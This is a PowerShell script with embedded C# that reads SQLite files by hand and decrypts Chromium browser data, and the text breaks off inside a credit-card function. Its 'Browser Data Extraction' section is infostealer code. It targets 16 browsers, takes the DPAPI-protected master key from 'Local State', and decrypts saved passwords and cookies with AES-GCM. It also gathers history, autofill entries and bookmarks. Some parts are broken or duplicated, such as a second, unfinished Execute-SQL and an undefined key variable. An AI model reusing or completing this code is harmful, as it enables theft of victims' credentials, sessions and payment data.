
#region C# Code for AES-GCM Decryption
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class AesGcmDecryptor
{
    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public ulong cbData;
        public int dwFlags;

        public static BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Create()
        {
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            info.dwInfoVersion = 1;
            return info;
        }
    }

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDecrypt(
        IntPtr hKey,
        byte[] pbInput,
        int cbInput,
        ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
        byte[] pbIV,
        int cbIV,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        int dwFlags
    );

    public static string Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlgorithm = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        int result;
        byte[] decrypted = null;

        try
        {
            result = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (result != 0) throw new Exception(string.Format("BCryptOpenAlgorithmProvider failed (0x{0:X8})", result));

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            result = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
            if (result != 0) throw new Exception(string.Format("BCryptSetProperty failed (0x{0:X8})", result));

            result = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (result != 0) throw new Exception(string.Format("BCryptGenerateSymmetricKey failed (0x{0:X8})", result));

            var authInfo = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.Create();
            authInfo.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, authInfo.pbNonce, iv.Length);
            authInfo.cbNonce = iv.Length;

            authInfo.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length);
            authInfo.cbTag = tag.Length;

            decrypted = new byte[ciphertext.Length];
            int decryptedLength;

            result = BCryptDecrypt(
                hKey,
                ciphertext,
                ciphertext.Length,
                ref authInfo,
                null,
                0,
                decrypted,
                decrypted.Length,
                out decryptedLength,
                0
            );

            if (result != 0) throw new Exception(string.Format("BCryptDecrypt failed (0x{0:X8})", result));

            return Encoding.UTF8.GetString(decrypted, 0, decryptedLength);
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@ -ReferencedAssemblies System.Security
#endregion

#region C# Code for Decoding SQLite Records
Add-Type @"
using System;
using System.Collections.Generic;

public class DecoderHelper
{
    public static ushort GetBigEndianUInt16(byte[] bytes, int offset)
    {
        return (ushort)((bytes[offset] << 8) | bytes[offset + 1]);
    }

    public static uint GetBigEndianUInt32(byte[] bytes, int offset)
    {
        return (uint)((bytes[offset] << 24) | (bytes[offset + 1] << 16) | (bytes[offset + 2] << 8) | bytes[offset + 3]);
    }

    public static long GetBigEndianInt64(byte[] bytes, int offset)
    {
        return ((long)bytes[offset] << 56) | ((long)bytes[offset + 1] << 48) | ((long)bytes[offset + 2] << 40) |
               ((long)bytes[offset + 3] << 32) | ((long)bytes[offset + 4] << 24) | ((long)bytes[offset + 5] << 16) |
               ((long)bytes[offset + 6] << 8) | bytes[offset + 7];
    }

    public static double GetBigEndianDouble(byte[] bytes, int offset)
    {
        long int64Bits = GetBigEndianInt64(bytes, offset);
        return BitConverter.ToDouble(BitConverter.GetBytes(int64Bits), 0);
    }

    public static string ConvertToBase64(byte[] bytes)
    {
        return Convert.ToBase64String(bytes);
    }
}
"@
#endregion

#region SQLite Decoder Functions
# --- Global temporary buffers for 64-bit conversion (to avoid per-call allocations) ---
if (-not $script:tmp8) { $script:tmp8 = New-Object byte[] 8 }
if (-not $script:tmp8Double) { $script:tmp8Double = New-Object byte[] 8 }

# --- Helper functions for big‑endian conversion ---

function Get-BigEndianUInt16 {
    param(
        [byte[]]$bytes,
        [int]$offset
    )
    return [System.UInt16]( ([int]$bytes[$offset] -shl 8) -bor [int]$bytes[$offset + 1] )
}

function Get-BigEndianUInt32 {
    param(
        [byte[]]$bytes,
        [int]$offset
    )
    return [System.UInt32]( ([int]$bytes[$offset] -shl 24) -bor ([int]$bytes[$offset+1] -shl 16) -bor ([int]$bytes[$offset+2] -shl 8) -bor [int]$bytes[$offset+3] )
}

function Get-BigEndianInt64 {
    param(
        [byte[]]$bytes,
        [int]$offset
    )
    for ($i = 0; $i -lt 8; $i++) {
        $script:tmp8[$i] = $bytes[$offset + (7 - $i)]
    }
    return [System.BitConverter]::ToInt64($script:tmp8, 0)
}

function Get-BigEndianDouble {
    param(
        [byte[]]$bytes,
        [int]$offset
    )
    for ($i = 0; $i -lt 8; $i++) {
        $script:tmp8Double[$i] = $bytes[$offset + (7 - $i)]
    }
    return [System.BitConverter]::ToDouble($script:tmp8Double, 0)
}

# --- Read a variable‑length integer (varint) (max 9 bytes) ---
function Read-VarInt {
    param(
        [byte[]]$bytes,
        [int]$offset
    )
    $value = 0; $length = 0
    for ($i = 0; $i -lt 9; $i++) {
        $b = $bytes[$offset + $i]
        $value = ($value -shl 7) -bor ($b -band 0x7F)
        $length++
        if (($b -band 0x80) -eq 0) { break }
    }
    return @{ Value = $value; Length = $length }
}

# --- Decode a value from the record body according to its serial type ---
function DecodeValue {
    param(
        [int]$serial,
        [byte[]]$bytes,
        [int]$offset
    )
    $result = @{ Value = $null; BytesRead = 0 }
    switch ($serial) {
        0 { $result.Value = $null; $result.BytesRead = 0; break }
        1 { $result.Value = [System.SByte]$bytes[$offset]; $result.BytesRead = 1; break }
        2 { $result.Value = [System.Int16](Get-BigEndianUInt16 -bytes $bytes -offset $offset); $result.BytesRead = 2; break }
        3 {
            $val = (([int]$bytes[$offset] -shl 16) -bor ([int]$bytes[$offset+1] -shl 8) -bor [int]$bytes[$offset+2])
            if ($bytes[$offset] -band 0x80) { $val = $val -bor (-1 -shl 24) }
            $result.Value = $val; $result.BytesRead = 3; break
        }
        4 { $result.Value = [System.Int32](Get-BigEndianUInt32 -bytes $bytes -offset $offset); $result.BytesRead = 4; break }
        5 {
            $val = 0; for ($i = 0; $i -lt 6; $i++) { $val = ($val -shl 8) -bor $bytes[$offset + $i] }
            if ($bytes[$offset] -band 0x80) { $val = $val -bor (-1 -shl 48) }
            $result.Value = $val; $result.BytesRead = 6; break
        }
        6 {
            if (($offset + 7) -lt $bytes.Length) {
                $result.Value = Get-BigEndianInt64 -bytes $bytes -offset $offset; $result.BytesRead = 8
            } else { $result.Value = 0; $result.BytesRead = 0 }
            break
        }
        7 { $result.Value = Get-BigEndianDouble -bytes $bytes -offset $offset; $result.BytesRead = 8; break }
        8 { $result.Value = 0; $result.BytesRead = 0; break }
        9 { $result.Value = 1; $result.BytesRead = 0; break }
        default {
            if ($serial -ge 12) {
                if (($serial % 2) -eq 0) {
                    $len = [int](($serial - 12) / 2)
                    $result.Value = New-Object byte[] $len
                    [System.Buffer]::BlockCopy($bytes, $offset, $result.Value, 0, $len)
                    $result.BytesRead = $len
                }
                else {
                    $len = [int](($serial - 13) / 2)
                    if ($len -gt 0 -and ($offset + $len) -le $bytes.Length) {
                        $result.Value = [System.Text.Encoding]::UTF8.GetString($bytes, $offset, $len)
                    } else { $result.Value = "" }
                    $result.BytesRead = $len
                }
            }
            else { $result.Value = $null; $result.BytesRead = 0 }
        }
    }
    return $result
}

# --- Combined varint decoder for a cell (payload length and rowid) ---
function Decode-CellVarInts {
    param(
        [byte[]]$fileBytes,
        [int]$cellAbs,
        [int]$pageEnd
    )
    $payload = 0; $rowid = 0; $pl = 0; $rl = 0
    # Decode payload length varint:
    for ($k = 0; $k -lt 9; $k++) {
        $b = $fileBytes[$cellAbs + $k]
        $payload = ($payload -shl 7) -bor ($b -band 0x7F)
        $pl++
        if (($b -band 0x80) -eq 0) { break }
    }
    # Decode rowid varint:
    for ($k = 0; $k -lt 9; $k++) {
        $b = $fileBytes[$cellAbs + $pl + $k]
        $rowid = ($rowid -shl 7) -bor ($b -band 0x7F)
        $rl++
        if (($b -band 0x80) -eq 0) { break }
    }
    return @{ PayloadLength = $payload; PayloadVarLen = $pl; Rowid = $rowid; RowidVarLen = $rl }
}

function Decode-RecordAt {
    param(
        [byte[]]$bytes,
        [int]$offset,
        [int]$length
    )
    $end = $offset + $length
    $local = $offset
    # Decode header size varint (max 9 bytes)
    $headerSize = 0
    $headerVarLen = 0
    for ($i = 0; $i -lt 9; $i++) {
        $b = $bytes[$local]
        $headerSize = ($headerSize -shl 7) -bor ($b -band 0x7F)
        $headerVarLen++
        $local++
        if (($b -band 0x80) -eq 0) { break }
    }

    $serialTypes = New-Object System.Collections.ArrayList
    $target = $offset + $headerSize
    while ($local -lt $target) {
        $serial = 0; $varLen = 0
        for ($i = 0; $i -lt 9; $i++) {
            $b = $bytes[$local]
            $serial = ($serial -shl 7) -bor ($b -band 0x7F)
            $varLen++
            $local++
            if (($b -band 0x80) -eq 0) { break }
        }
        $serialTypes.Add($serial) | Out-Null
    }

    $bodyOffset = $offset + $headerSize
    $values = New-Object System.Collections.ArrayList
    foreach ($serial in $serialTypes) {
        $decoded = DecodeValue -serial $serial -bytes $bytes -offset $bodyOffset
        $values.Add($decoded.Value) | Out-Null
        $bodyOffset += $decoded.BytesRead
    }

    # Use C# to convert byte arrays to base64 string when processing password_value
    $passwordValueIndex = 2  # Example index for password value in the data record
    if ($values[$passwordValueIndex] -is [byte[]]) {
        $values[$passwordValueIndex] = [DecoderHelper]::ConvertToBase64($values[$passwordValueIndex])
    }

    return $values
}
#endregion

#region SQLite B-tree Walker And Leaf Page Processor
# --- Iterative B‑tree walker that works directly on the file bytes (avoids page copies) ---
function Get-BtreeRowsFromFile {
    param(
        $db,
        [int]$pageNumber
    )
    $file = $db.FileBytes
    $psize = $db.PageSize
    $rows = New-Object System.Collections.ArrayList
    $stack = New-Object System.Collections.Stack
    function NewFrame([int]$pnum) {
        $start = ($pnum - 1) * $psize
        $base = if ($pnum -eq 1) { 100 } else { 0 }
        $abs = $start + $base
        $ptype = $file[$abs]
        $ncells = 0
        if ($ptype -eq 0x0D -or $ptype -eq 0x05) {
            $ncells = (([int]$file[$abs + 3]) -shl 8) -bor [int]$file[$abs + 4]
        }
        return [PSCustomObject]@{
            PageNumber   = $pnum;
            Offset       = $start;
            BaseOffset   = $base;
            PageType     = $ptype;
            NumCells     = $ncells;
            CurrentIndex = 0
        }
    }
    $stack.Push((NewFrame $pageNumber))
    while ($stack.Count -gt 0) {
        $frame = $stack.Peek()
        if ($frame.PageType -eq 0x05) {
            if ($frame.CurrentIndex -lt $frame.NumCells) {
                $cpOffset = $frame.BaseOffset + 12 + ($frame.CurrentIndex * 2)
                $absIndex = $frame.Offset + $cpOffset
                $cellPointer = (([int]$file[$absIndex]) -shl 8) -bor [int]$file[$absIndex + 1]
                $childAbs = $frame.Offset + $cellPointer
                $childPageNumber = (([int]$file[$childAbs]) -shl 24) -bor (([int]$file[$childAbs+1]) -shl 16) -bor (([int]$file[$childAbs+2]) -shl 8) -bor [int]$file[$childAbs+3]
                $frame.CurrentIndex++
                $stack.Push((NewFrame $childPageNumber))
                continue
            }
            else {
                $absIndex = $frame.Offset + $frame.BaseOffset + 8
                $rightChildPageNumber = (([int]$file[$absIndex]) -shl 24) -bor (([int]$file[$absIndex+1]) -shl 16) -bor (([int]$file[$absIndex+2]) -shl 8) -bor [int]$file[$absIndex+3]
                $stack.Pop() | Out-Null
                $stack.Push((NewFrame $rightChildPageNumber))
                continue
            }
        }
        elseif ($frame.PageType -eq 0x0D) {
            for ($i = 0; $i -lt $frame.NumCells; $i++) {
                $cpOffset = $frame.BaseOffset + 8 + ($i * 2)
                $absIndex = $frame.Offset + $cpOffset
                $cellPointer = (([int]$file[$absIndex]) -shl 8) -bor [int]$file[$absIndex + 1]
                $cellAbs = $frame.Offset + $cellPointer
                $dv = Decode-CellVarInts -fileBytes $file -cellAbs $cellAbs -pageEnd ($frame.Offset + $psize)
                $totalVarLength = $dv.PayloadVarLen + $dv.RowidVarLen
                $payloadOffset = $cellAbs + $totalVarLength
                $record = Decode-RecordAt -bytes $file -offset $payloadOffset -length $dv.PayloadLength
                $obj = [PSCustomObject]@{
                    rowid = $dv.Rowid;
                    Data  = $record
                }
                $rows.Add($obj) | Out-Null
            }
            $stack.Pop() | Out-Null
            continue
        }
        else {
            Write-Error "Unsupported page type: 0x{0:X2} on page {1}" -f $frame.PageType, $frame.PageNumber
            $stack.Pop() | Out-Null
        }
    }
    return $rows
}

# --- Collect all leaf page frames from the B-tree (for parallel processing) ---
function Get-LeafPages {
    param(
        $db,
        [int]$rootPageNumber
    )
    $file = $db.FileBytes
    $psize = $db.PageSize
    $leafPages = New-Object System.Collections.ArrayList
    $stack = New-Object System.Collections.Stack
    function NewFrame([int]$pnum) {
        $start = ($pnum - 1) * $psize
        $base = if ($pnum -eq 1) { 100 } else { 0 }
        $abs = $start + $base
        $ptype = $file[$abs]
        $ncells = 0
        if ($ptype -eq 0x0D -or $ptype -eq 0x05) {
            $ncells = (([int]$file[$abs + 3]) -shl 8) -bor [int]$file[$abs + 4]
        }
        return [PSCustomObject]@{
            PageNumber   = $pnum;
            Offset       = $start;
            BaseOffset   = $base;
            PageType     = $ptype;
            NumCells     = $ncells;
            CurrentIndex = 0
        }
    }
    $stack.Push((NewFrame $rootPageNumber))
    while ($stack.Count -gt 0) {
        $frame = $stack.Pop()
        if ($frame.PageType -eq 0x05) {
            for ($i = 0; $i -lt $frame.NumCells; $i++) {
                $cpOffset = $frame.BaseOffset + 12 + ($i * 2)
                $absIndex = $frame.Offset + $cpOffset
                $cellPointer = (([int]$file[$absIndex]) -shl 8) -bor [int]$file[$absIndex + 1]
                $childAbs = $frame.Offset + $cellPointer
                $childPageNumber = (([int]$file[$childAbs]) -shl 24) -bor (([int]$file[$childAbs+1]) -shl 16) -bor (([int]$file[$childAbs+2]) -shl 8) -bor [int]$file[$childAbs+3]
                $stack.Push((NewFrame $childPageNumber))
            }
            $absIndex = $frame.Offset + $frame.BaseOffset + 8
            $rightChildPageNumber = (([int]$file[$absIndex]) -shl 24) -bor (([int]$file[$absIndex+1]) -shl 16) -bor (([int]$file[$absIndex+2]) -shl 8) -bor [int]$file[$absIndex+3]
            $stack.Push((NewFrame $rightChildPageNumber))
        }
        elseif ($frame.PageType -eq 0x0D) {
            $leafPages.Add($frame) | Out-Null
        }
        else {
            Write-Error "Unsupported page type: 0x{0:X2} on page {1}" -f $frame.PageType, $frame.PageNumber
        }
    }
    return $leafPages
}

# --- Process a leaf page (decoding its cells) ---
function Process-LeafPage {
    param(
        $db,
        $frame
    )
    $file = $db.FileBytes
    $psize = $db.PageSize
    $rows = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $frame.NumCells; $i++) {
        $cpOffset = $frame.BaseOffset + 8 + ($i * 2)
        $absIndex = $frame.Offset + $cpOffset
        $cellPointer = (([int]$file[$absIndex]) -shl 8) -bor [int]$file[$absIndex + 1]
        $cellAbs = $frame.Offset + $cellPointer
        $dv = Decode-CellVarInts -fileBytes $file -cellAbs $cellAbs -pageEnd ($frame.Offset + $psize)
        $totalVarLength = $dv.PayloadVarLen + $dv.RowidVarLen
        $payloadOffset = $cellAbs + $totalVarLength
        $record = Decode-RecordAt -bytes $file -offset $payloadOffset -length $dv.PayloadLength
        $row = [PSCustomObject]@{
            rowid = $dv.Rowid;
            Data  = $record
        }
        $rows.Add($row) | Out-Null
    }
    return $rows
}

# --- Process leaf pages in parallel using runspaces ---
function Get-BtreeRowsFromFileParallel {
    param(
        $db,
        [int]$rootPageNumber
    )
    $leafPages = Get-LeafPages -db $db -rootPageNumber $rootPageNumber
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
    $runspacePool.Open()
    $jobs = @()
    foreach ($frame in $leafPages) {
        $ps = [powershell]::Create().AddScript({
            param($db, $frame)
            Process-LeafPage -db $db -frame $frame
        }).AddArgument($db).AddArgument($frame)
        $ps.RunspacePool = $runspacePool
        $job = $ps.BeginInvoke()
        $jobs += [PSCustomObject]@{ Pipeline = $ps; AsyncResult = $job }
    }
    $results = New-Object System.Collections.ArrayList
    foreach ($job in $jobs) {
        $result = $job.Pipeline.EndInvoke($job.AsyncResult)
        $results.AddRange($result)
        $job.Pipeline.Dispose()
    }
    $runspacePool.Close()
    return $results
}

function Extract-TableColumnNames {
    param(
        [string]$sql
    )
    # Find the first "(" and the last ")" in the SQL.
    $openParen = $sql.IndexOf("(")
    $closeParen = $sql.LastIndexOf(")")
    if ($openParen -eq -1 -or $closeParen -eq -1 -or $closeParen -le $openParen) {
        return @()
    }
    # Get the text inside the outermost parentheses.
    $inside = $sql.Substring($openParen + 1, $closeParen - $openParen - 1)
    # If the UNIQUE clause (or PRIMARY KEY clause) is present,
    # take only the portion before it.
    $uniqueIndex = $inside.IndexOf("UNIQUE", [System.StringComparison]::InvariantCultureIgnoreCase)
    if ($uniqueIndex -gt 0) {
        $inside = $inside.Substring(0, $uniqueIndex)
    }
    # Split the inside text on commas.
    $parts = $inside -split ","
    $colNames = @()
    foreach ($part in $parts) {
        $trim = $part.Trim()
        if ($trim -eq "") { continue }
        # Skip any parts that start with keywords (e.g. PRIMARY, UNIQUE, CONSTRAINT)
        if ($trim -match "^(PRIMARY|UNIQUE|CONSTRAINT)") { continue }
        $tokens = $trim -split "\s+"
        if ($tokens.Count -gt 0) {
            $colNames += $tokens[0]
        }
    }
    return $colNames
}
#endregion

#region SQLite Loader
function Load-SQLiteSchema {
    param($db)
    $schemaRows = Get-BtreeRowsFromFile -db $db -pageNumber 1
    $schema = @{}
    foreach ($row in $schemaRows) {
        $cols = $row.Data
        if ($cols.Count -ge 5) {
            $tableName = $cols[1].ToString().Trim().ToLower()
            $schema[$tableName] = @{
                Type     = $cols[0];
                TblName  = $cols[2];
                RootPage = $cols[3];
                SQL      = $cols[4]
            }
        }
    }
    return $schema
}

function Execute-SQL {
    param(
        $database,
        [Parameter(Mandatory=$true)]
        [string]$Query
    )
    if ($Query -match "(?i)^SELECT\s+(?<columns>[\w\*,\s]+)\s+FROM\s+(?<table>\S+)(\s+ORDER\s+BY\s+(?<orderby>\S+)(\s+(?<orderdir>ASC|DESC))?)?(\s+LIMIT\s+(?<limit>\d+))?\s*;?\s*$") {
        $tableName = $matches['table'].Trim().ToLower()
        if (-not $database.Schema.ContainsKey($tableName)) {
            $available = $database.Schema.Keys -join ', '
            throw "Table '$tableName' not found in schema. Available tables: $available"
        }
        $rootPage = [int]$database.Schema[$tableName].RootPage
        $rows = Get-BtreeRowsFromFile -db $database -pageNumber $rootPage

        $sql = $database.Schema[$tableName].SQL
        $schemaColNames = Extract-TableColumnNames $sql
        $selColsRaw = $matches['columns'].Trim()
        if ($selColsRaw -eq "*") {
            $selectedColumns = $schemaColNames
        }
        else {
            $selectedColumns = $selColsRaw -split "," | ForEach-Object { $_.Trim() }
            foreach ($col in $selectedColumns) {
                if (-not ($schemaColNames -contains $col)) {
                    $available = $schemaColNames -join ", "
                    throw "Column '$col' is not present in table '$tableName'. Available columns: $available"
                }
            }
        }
        # ... rest of your Execute-SQL remains unchanged ...
    }
    else {
        throw "Only queries of the form 'SELECT <columns> FROM <table> [ORDER BY <col> [ASC|DESC]] [LIMIT <n>]' are supported."
    }
}

# --- Open a SQLite3 database file ---
function Open-SQLiteDatabase {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )
    if (-not (Test-Path $Path)) { throw "Database file '$Path' not found." }
    $fileBytes = [System.IO.File]::ReadAllBytes($Path)
    $header = [System.Text.Encoding]::ASCII.GetString($fileBytes, 0, 16)
    if ($header -ne "SQLite format 3`0") { throw "Not a valid SQLite3 database file." }
    $pageSize = Get-BigEndianUInt16 -bytes $fileBytes -offset 16
    if ($pageSize -eq 1) { $pageSize = 65536 }
    $db = [PSCustomObject]@{
        FileBytes = $fileBytes;
        PageSize  = $pageSize;
        Schema    = $null
    }
    $db.Schema = Load-SQLiteSchema -db $db
    return $db
}

# --- Execute-SQL (normalize query table name) ---
function Execute-SQL {
    param(
        $database,
        [Parameter(Mandatory=$true)]
        [string]$Query
    )
    if ($Query -match "(?i)^SELECT\s+(?<columns>[\w\*,\s]+)\s+FROM\s+(?<table>\S+)(\s+ORDER\s+BY\s+(?<orderby>\S+)(\s+(?<orderdir>ASC|DESC))?)?(\s+LIMIT\s+(?<limit>\d+))?\s*;?\s*$") {
        # Normalize the table name from the query.
        $tableName = $matches['table'].Trim().ToLower()
        if (-not $database.Schema.ContainsKey($tableName)) {
            $available = $database.Schema.Keys -join ', '
            throw "Table '$tableName' not found in schema. Available tables: $available"
        }
        $rootPage = [int]$database.Schema[$tableName].RootPage
        $rows = Get-BtreeRowsFromFile -db $database -pageNumber $rootPage

        $sql = $database.Schema[$tableName].SQL
        $schemaColNames = Extract-TableColumnNames $sql
        $selColsRaw = $matches['columns'].Trim()
        if ($selColsRaw -eq "*") {
            $selectedColumns = $schemaColNames
        }
        else {
            $selectedColumns = $selColsRaw -split "," | ForEach-Object { $_.Trim() }
            foreach ($col in $selectedColumns) {
                if (-not ($schemaColNames -contains $col)) {
                    $available = $schemaColNames -join ", "
                    throw "Column '$col' is not present in table '$tableName'. Available columns: $available"
                }
            }
            
        }
        $colIndexMap = @{}
        for ($i = 0; $i -lt $schemaColNames.Count; $i++) {
            $colIndexMap[$schemaColNames[$i].ToLower()] = $i
        }
        $output = New-Object System.Collections.ArrayList
        foreach ($row in $rows) {
            $hash = @{}
            foreach ($col in $selectedColumns) {
                $idx = $colIndexMap[$col.ToLower()]
                if ($col -eq "password_value" -and $idx -lt $row.Data.Count -and $row.Data[$idx] -is [byte[]]) {
                    # Convert the byte array to a Base64 string for JSON storage
                    $hash[$col] = [System.Convert]::ToBase64String($row.Data[$idx])
                } else {
                    $hash[$col] = if ($idx -lt $row.Data.Count) { $row.Data[$idx] } else { $null }
                }
                
            }
            $output.Add([pscustomobject]$hash) | Out-Null
        }
        if ($matches['orderby']) {
            $orderCol = $matches['orderby']
            if ($matches['orderdir'] -and ($matches['orderdir'].ToUpper() -eq "DESC")) {
                $output = $output | Sort-Object -Property $orderCol -Descending
            }
            else {
                $output = $output | Sort-Object -Property $orderCol
            }
        }
        if ($matches['limit']) {
            $lim = [int]$matches['limit']
            if ($output.Count -gt $lim) { $output = $output[0..($lim - 1)] }
        }
        return $output
    }
    else {
        throw "Only queries of the form 'SELECT <columns> FROM <table> [ORDER BY <col> [ASC|DESC]] [LIMIT <n>]' are supported."
    }
}
#endregion

#region Browser Data Extraction
$localAppData = [System.Environment]::GetEnvironmentVariable('LOCALAPPDATA')
$browsers = @{
    'amigo' = "$localAppData\Amigo\User Data"
    'torch' = "$localAppData\Torch\User Data"
    'kometa' = "$localAppData\Kometa\User Data"
    'orbitum' = "$localAppData\Orbitum\User Data"
    'cent-browser' = "$localAppData\CentBrowser\User Data"
    '7star' = "$localAppData\7Star\7Star\User Data"
    'sputnik' = "$localAppData\Sputnik\Sputik\User Data"
    'vivaldi' = "$localAppData\Vivaldi\User Data"
    'google-chrome-sxs' = "$localAppData\Google\Chrome SxS\User Data"
    'google-chrome' = "$localAppData\Google\Chrome\User Data"
    'epic-privacy-browser' = "$localAppData\Epic Privacy Browser\User Data"
    'microsoft-edge' = "$localAppData\Microsoft\Edge\User Data"
    'uran' = "$localAppData\uCozMedia\Uran\User Data"
    'yandex' = "$localAppData\Yandex\YandexBrowser\User Data"
    'brave' = "$localAppData\BraveSoftware\Brave-Browser\User Data"
    'iridium' = "$localAppData\Iridium\User Data"
}

# Function to decrypt the passwords
function Decrypt-Password($encryptedPassword, $masterKey) {
    $iv = $encryptedPassword[3..14]
    $ciphertext = $encryptedPassword[15..($encryptedPassword.Length - 17)]
    $authTag = $encryptedPassword[($encryptedPassword.Length - 16)..($encryptedPassword.Length - 1)]
    
    try {
        # Decrypt the password using AesGcmDecryptor
        $decryptedPassword = [AesGcmDecryptor]::Decrypt($masterKey, $iv, $ciphertext, $authTag)
        return $decryptedPassword
    } catch {
        Write-Output "Decryption failed: $_"
        return $null
    }
}

function Get-MasterKey {
    param(
        [Parameter(Mandatory=$true)]
        [string]$BrowserPath
    )

    $localStatePath = Join-Path $BrowserPath "Local State"
    if (-not (Test-Path $localStatePath)) {
        throw "Local State file not found at: $localStatePath"
    }

    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]  # Remove DPAPI prefix
        
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $masterKey
    }
    catch {
        Write-Error "Failed to get master key: $_"
        return $null
    }
}

# Function to get browser history
function Get-BrowserHistory($browserPath) {
    $historyPath = Join-Path $browserPath "Default\History"
    if (Test-Path $historyPath) {
        $tempDbPath = [System.IO.Path]::GetTempFileName()
        try {
            Copy-Item -Path $historyPath -Destination $tempDbPath -Force
            $db = Open-SQLiteDatabase -Path $tempDbPath
            $result = Execute-SQL -database $db -Query "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
            $history = $result | ForEach-Object {
                [PSCustomObject]@{
                    URL         = $_.url
                    Title       = $_.title
                    LastVisited = [DateTime]::FromFileTime($_.last_visit_time)
                }
            }
            return $history
        } finally {
            Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        }
    }
    return $null
}

# Function to get browser cookies
function Get-BrowserCookies($browserPath) {
    $cookiesPath = Join-Path $browserPath "Default\Network\Cookies"
    if (Test-Path $cookiesPath) {
        $tempDbPath = [System.IO.Path]::GetTempFileName()
        try {
            try {
                Copy-Item -Path $cookiesPath -Destination $tempDbPath -Force
                $db = Open-SQLiteDatabase -Path $tempDbPath
            }
            catch {
                Write-Warning "cookies are yummy"
                return $null
            }
            $result = Execute-SQL -database $db -Query "SELECT host_key, name, path, encrypted_value FROM cookies"
            $cookies = $result | ForEach-Object {
                [PSCustomObject]@{
                    Host     = $_.host_key
                    Name     = $_.name
                    Path     = $_.path
                    Value    = (Decrypt-Password [System.Convert]::FromBase64String($_.encrypted_value) $masterKey)
                }
            }
            return $cookies
        } finally {
            Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        }
    }
    return $null
}

# Function to get autofill data
function Get-AutofillData($browserPath, $browser) {
    $webDataPath = Join-Path $browserPath "Default\Web Data"
    if (Test-Path $webDataPath) {
        $tempDbPath = [System.IO.Path]::GetTempFileName()
        try {
            Copy-Item -Path $webDataPath -Destination $tempDbPath -Force
            $db = Open-SQLiteDatabase -Path $tempDbPath
            $result = Execute-SQL -database $db -Query "SELECT name, value FROM autofill"
            $autofill = $result | ForEach-Object {
                [PSCustomObject]@{
                    Name  = $_.name
                    Value = $_.value
                    Browser = $browser
                }
            }
            return $autofill
        } finally {
            Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        }
    }
    return $null
}

# Function to get browser bookmarks
function Get-Bookmarks {
    param(
        [Parameter(Mandatory=$true)]
        [string]$BrowserPath,
        [Parameter(Mandatory=$true)]
        [string]$Browser
    )
    
    function Get-BookmarkItems {
        param($node)
        $items = @()
        if ($node.type -eq 'url') {
            $items += [PSCustomObject]@{
                Name = $node.name
                URL = $node.url
                Browser = $Browser
                DateAdded = [DateTime]::FromFileTimeUtc($node.date_added)
            }
        }
        elseif ($node.type -eq 'folder' -and $node.children) {
            foreach ($child in $node.children) {
                $items += Get-BookmarkItems -node $child
            }
        }
        return $items
    }
    
    $bookmarkFile = Join-Path $BrowserPath "Default\Bookmarks"
    if (-not (Test-Path $bookmarkFile)) {
        return $null
    }

    try {
        $data = Get-Content $bookmarkFile -Raw
        $bookmarks = $data | ConvertFrom-Json
        $entries = @()
        
        foreach ($root in $bookmarks.roots.PSObject.Properties) {
            $entries += Get-BookmarkItems -node $root.Value
        }
        
        return $entries
    }
    catch {
        Write-Error "Failed to parse bookmarks for $Browser : $_"
        return $null
    }
}

# Function to get credit cards
function Get-BrowserCards($browserPath, $browser, $masterKey) {
    $webDataPath = Join-Path $browserPath "Default\Web Data"
